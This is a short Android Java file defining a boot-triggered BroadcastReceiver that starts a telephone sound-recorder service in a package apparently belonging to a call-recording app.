package com.service.ruyinji;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootAudioRecorderBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Intent it = new Intent(context, TelephoneSoundRecorderService.class);
		context.startService(it);
	}

}
